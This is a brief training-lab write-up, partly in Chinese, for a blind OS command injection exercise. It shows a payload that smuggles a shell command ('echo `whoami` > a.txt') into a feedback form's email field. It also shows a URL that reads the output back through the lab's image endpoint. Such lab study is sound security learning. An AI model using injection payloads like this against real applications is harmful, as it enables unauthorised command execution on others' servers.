# Lab: Blind OS command injection with output redirection

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
```
/var/www/images/
```
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.

## OS command injection
* 題目說要寫入 `/var/www/images/`，寫入的內容是 whoami
```
payload = 123@123.com||echo `whoami` > a.txt||
```
* 之後用 image 訪問就可以了
```
https://ace91f701f8674b9c02329b800c40097.web-security-academy.net/image?filename=a.txt
```